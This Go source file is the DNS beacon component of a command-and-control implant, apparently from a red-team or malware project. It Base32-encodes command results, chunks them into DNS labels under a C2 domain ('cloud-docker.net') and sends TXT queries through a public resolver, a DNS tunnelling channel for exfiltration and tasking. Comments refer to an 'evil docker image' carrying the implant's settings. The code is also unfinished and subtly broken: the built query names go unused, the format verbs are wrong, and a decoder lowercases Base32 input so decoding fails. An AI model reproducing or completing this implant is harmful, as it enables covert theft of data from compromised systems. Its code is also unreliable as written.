package main

import (
	"encoding/base32"
	"flag"
	"fmt"
	"github.com/miekg/dns"
	"log"
	"strings"
)

// TODO: all communications (commands + results) should be encoded + decoded + encrypted -> verify this at the end
// TODO: want flags? - or just write comment saying if we wanna change these hardcoded values in the implant, we can just change the evil docker image
var (
	domain = flag.String("domain", "cloud-docker.net", "C2 domain to query")
	// TODO: look at this
	server = flag.String("server", "8.8.8.8:53", "DNS server addr (ip:port)")
)

// TODO: only cmd tasks supported in DNSImplant at the time?
type DNSC2Communicator struct{}

/*
	// TODO: move this somewhere else
		DNS limits:
		- full QNAME (∑ (1 + len(labelᵢ))  +  1  ≤  255)
			- each label is prefixed by a single length-octet
			- terminated by zero length-octet (0x00)
		- each label must be maximum 63 bytes
*/

// TODO: write comment
func (D *DNSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQueue, error) {
	// prepare a no‑padding Base32 encoder: will remove extra "=" padding that Base32 appends to an encoded string so that it's length is a multiple of 8 (encoding block size)
	b32 := base32.StdEncoding.WithPadding(base32.NoPadding)
	const maxLabelLen = 63 // 63 octets is the maximum length of a DNS label as specified in RFC 1035, Section 2.3.4

	// TODO: rename totalChunkCount?
	// implantID.taskID.totalChunkCount.chunkIndex.chunkData.res.<domain>
	// 1. send existing results to DNS server
	for _, result := range results {

		raw := result.Content
		if !result.Success {
			raw = "[FAIL]" + raw // TODO: need this -> come back and check after figuring out how it handles failed command tasks
		}

		encoded := b32.EncodeToString([]byte(raw))

		// break raw into 63-byte chunks
		var chunks []string
		for i := 0; i < len(encoded); i += maxLabelLen {
			end := i + maxLabelLen
			if end > len(encoded) {
				end = len(encoded)
			}
			chunks = append(chunks, encoded[i:end])
		}
		totalChunkCount := len(chunks)

		for index, chunk := range chunks {
			// index is 0-based; chunkIndex is 1-based
			qname := fmt.Sprintf(
				"%s.%02d.%02d.%02d.%s.res.%s",
				implantID,       // e.g. "01"
				result.TaskID,   // e.g.  1 → "01"
				totalChunkCount, // total chunks → "02", "03", …
				index+1,         // this chunk’s index → "01", "02", …
				chunk,           // the Base32 payload slice
				*domain,         // your root domain
			)
			fqdn := dns.Fqdn(qname)

			log.Printf("LOG DETAILED MESSAGE IN HERE")
		}

		if result.Success {
			numLabels := 8
			remainingLen := 255 - numLabels - 1
			questions := make([]string, 0)
			if len([]byte(result.Content)) > remainingLen {
				// divide - have multiple questions ready
				//
			} else {
				questions = append(questions, dns.Fqdn(fmt.Sprintf("%s.%02d.%s", implantID, result.TaskID, domain))) // do %02d for the implantID as well?
			}
			for _, question := range questions {
				m := new(dns.Msg)
				m.SetQuestion(question, dns.TypeTXT)
				fmt.Printf(question)
				_, _, err := new(dns.Client).Exchange(m, *server)
				if err != nil { // TODO: have server send success in in instead?
					panic(err) // TODO: fix error handling
				}
			}
		} else {
			// TODO -> handle this, c2 server still needs to receive a result to know it failed
		}
	}

	// 2. get new tasks from DNS server, make them into TaskQueue
	return NewTaskQueue(), nil
}

func b32Encoder(data string) string {
	b32 := base32.StdEncoding.WithPadding(base32.NoPadding)
	return b32.EncodeToString([]byte(data))
}

func b32Decoder(encodedData string) (string, error) {
	lowercaseEncodedData := strings.ToLower(encodedData)
	data, err := base32.StdEncoding.DecodeString(lowercaseEncodedData)
	return string(data), err
}

func NewDNSC2Communicator() *DNSC2Communicator {
	return &DNSC2Communicator{}
}
